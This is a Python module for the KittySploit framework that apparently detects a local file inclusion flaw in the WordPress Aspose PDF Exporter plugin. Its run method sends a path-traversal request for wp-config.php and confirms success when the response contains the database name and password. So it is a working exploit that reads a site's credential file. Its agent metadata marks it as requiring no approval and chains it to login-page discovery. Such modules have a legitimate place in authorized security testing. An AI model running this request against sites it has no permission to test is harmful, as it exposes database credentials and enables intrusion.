#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Aspose PDF Exporter is vulnerable to local file inclusion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Aspose PDF Exporter - Local File Inclusion Detection',
        'description': 'WordPress Aspose PDF Exporter is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'aspose', 'packetstorm', 'wordpress', 'wp-plugin', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/131161',
            'https://wordpress.org/plugins/aspose-pdf-exporter',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Aspose PDF Exporter - Local File Inclusion detected",
                path='/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php',
            )
            return True
        return False

